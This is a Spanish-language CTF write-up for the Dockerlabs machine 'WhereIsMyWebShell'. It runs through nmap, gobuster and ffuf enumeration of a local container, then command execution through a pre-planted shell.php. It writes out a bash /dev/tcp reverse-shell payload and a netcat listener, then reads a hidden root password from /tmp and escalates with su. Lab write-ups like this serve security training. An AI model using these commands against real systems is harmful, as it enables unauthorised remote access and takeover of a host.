---
title:  "WhereIsMyWebShell - Dockerlabs"
header:
  teaser:
categories: 
  - CTFs
tags:
  - Dockerlabs
---

**WhereIsMyWebShell** es una máquina de nivel fácil disponible en la plataforma [Dockerlabs](https://dockerlabs.es/). Debemos aprovechar una webshell ya subida para obtener acceso a la máquina. Luego, encontraremos la contraseña de root en un archivo oculto dentro de /tmp.

## Reconocimiento

Comienzo levantando la máquina docker con el script de auto_deploy. Verifico que se encuentra activa haciendo un ping.

```shell
ping -c 1 172.17.0.2                                                                                                                                
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.031 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.031/0.031/0.031/0.000 ms
```

El siguiente paso es hacer un nmap para ver que puertos tiene abiertos. Utilizo los siguientes parámetros:

- -p-: Escanear todos los puertos (65535).
- –open: Mostrar solo los puertos abiertos.
- -sS: Realiza un TCP SYN Scan para escanear rápidamente que puertos están abiertos.
- –min-rate 5000: Indicamos que el escaneo no vaya más lento que 5000 paquetes por segundo.
- -vvv: El modo verbose nos muestra la información según se va encontrando.
- -n: No realizar resolución de DNS. Así evitamos que el escaneo dure más tiempo del necesario.
- -Pn: Deshabilitar el descubrimiento de host mediante ping.
- -oG: Exportar el resultado a un fichero en una sola línea para que podamos usar comandos como: grep, awk, sed, etc. 

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports                                                                  

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 10:39 EDT
Initiating ARP Ping Scan at 10:39
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 10:39, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:39
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 10:39, 0.76s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000060s latency).
Scanned at 2024-05-30 10:39:36 EDT for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Solo hay 1 puerto abierto:

- 80 (HTTP)

Ejecuto otro nmap para analizar los servicios y versiones de ese puerto. Los comandos usados son:

- -sCV: Detectar el servicio y aplicar scripts básicos de reconocimiento.
- -p: Indicar los puertos a escanear.
- -oN: Exportar el resultado a un archivo.

```shell
nmap -sCV -p80 172.17.0.2 -oN target                                                                                                                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 10:42 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000095s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)
|_http-server-header: Apache/2.4.57 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.33 seconds
```

Utilizo whatweb para ver que tecnologías utiliza la página.

```shell
whatweb http://172.17.0.2                                                                                                                           
http://172.17.0.2 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[172.17.0.2], Title[Academia de Inglés (Inglis Academi)]
```

Para enumerar directorios y archivos utilizo dirsearch. Le indico que no me muestre varios códigos de estado HTTP.

```shell
dirsearch -u http://172.17.0.2 --exclude-status 403,404,500,502,400,401   

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/whereismywebshell/nmap/reports/http_172.17.0.2/_24-05-30_10-44-04.txt

Target: http://172.17.0.2/

[10:44:04] Starting: 

Task Completed
```

Como no consigue nada, pruebo con gobuster.

```shell
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x html,php,txt,js                                                                                     
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 2510]
/shell.php            (Status: 500) [Size: 0]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/warning.html         (Status: 200) [Size: 315]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

## Análisis de vulnerabilidades

Accedo a la web. 

![WhereIsMyWebShell 1](/assets/images/2024-05-30-WhereIsMyWebShell/WhereIsMyWebShell_1.PNG)

Al final de la página encuentro el siguiente texto: *"Guardo un secretito en /tmp ;)"*. 

Miro el código fuente, pero no encuentro nada.

![WhereIsMyWebShell 4](/assets/images/2024-05-30-WhereIsMyWebShell/WhereIsMyWebShell_4.PNG)

Voy al fichero "warning.html" que ha encontrado gobuster.

![WhereIsMyWebShell 2](/assets/images/2024-05-30-WhereIsMyWebShell/WhereIsMyWebShell_2.PNG)

El código tampoco oculta alguna pista.

![WhereIsMyWebShell 5](/assets/images/2024-05-30-WhereIsMyWebShell/WhereIsMyWebShell_5.PNG)

Voy a shell.php para ver si hay algo. 

![WhereIsMyWebShell 3](/assets/images/2024-05-30-WhereIsMyWebShell/WhereIsMyWebShell_3.PNG)

## Explotación de vulnerabilidades

Al ser una webshell, es posible que esté esperando algún parámetro. Con la herramienta ffuf pruebo a fuzear parámetros. Uso los siguientes comandos:

- -u: Ruta que se va a fuzear. Con FUZZ se indica la posición donde se utilizara el diccionario.
- -w: Para especificar un diccionario.
- -t: Número de hilos.
- -fc: Excluir códigos HTTP.

```shell
ffuf -u http://172.17.0.2/shell.php\?FUZZ\=whoami -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -t 200 -fc 500  

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/shell.php?FUZZ=whoami
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

parameter               [Status: 200, Size: 21, Words: 1, Lines: 3, Duration: 16ms]
:: Progress: [6453/6453] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Ha conseguido encontrar "parameter". Lo pruebo y efectivamente me ejecuta el comando.

![WhereIsMyWebShell 6](/assets/images/2024-05-30-WhereIsMyWebShell/WhereIsMyWebShell_6.PNG)

En la web se indicaba que había un secreto en `/tmp`, pero cuando hago un `ls` no veo nada.

![WhereIsMyWebShell 7](/assets/images/2024-05-30-WhereIsMyWebShell/WhereIsMyWebShell_7.PNG) 

Intento conseguir una reverse shell, para ello me pongo en escucha con netcat y ejecuto el comando `bash -c "bash -i >%26 /dev/tcp/172.17.0.1/4321 0>%261"` (importante hacer URL encode de & a %26). Consigo obtener acceso al sistema.

```shell
nc -nlvp 4321                                                                                                                                       
listening on [any] 4321 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 34200
bash: cannot set terminal process group (23): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bf6660af2dc2:/var/www/html$ 
```

## Escalada de privilegios

Para tener una consola interactiva, hay que hacer un tratamiento de la tty. Ejecuto `script /dev/null -c bash`, hago ***ctrl+z***, escribo ***"stty raw -echo; fg"***, introduzco ***"reset xterm"*** y doy un ***intro***. Con esto he reiniciado la configuración de la terminal.

```shell
www-data@bf6660af2dc2:/var/www/html$ 
```

La shell todavía no es interactiva del todo. Veo que la variable de entorno $TERM tiene el valor dump y no xterm. Esto se puede arreglar con `export TERM=xterm`. 

```shell
www-data@bf6660af2dc2:/var/www/html$ echo $TERM
dumb
www-data@bf6660af2dc2:/var/www/html$ export TERM=xterm
```

La proporción de la consola no es igual a la de terminal. Miro el tamaño con `stty size`.

```shell
www-data@bf6660af2dc2:/var/www/html$ stty size
24 80
```

En la máquina hay 24 filas y 80 columnas, pero en mi kali son 63 filas y 281 columnas. Las modifico para que tengan el mismo espacio.

```shell
www-data@bf6660af2dc2:/var/www/html$ stty rows 63 columns 281
```

Antes no había encontrado nada en /tmp, pero ahora pruebo con `ls -la` y veo que hay un fichero oculto llamado "secret.txt". Leo su contenido y parece ser la password del usuario root.

```shell
www-data@bf6660af2dc2:/$ cat /tmp/.secret.txt
contraseñaderoot123
```

Usando su contraseña, consigo ser root.

```shell
www-data@bf6660af2dc2:/$ su   
Password: 
root@bf6660af2dc2:/# whoami
root
```

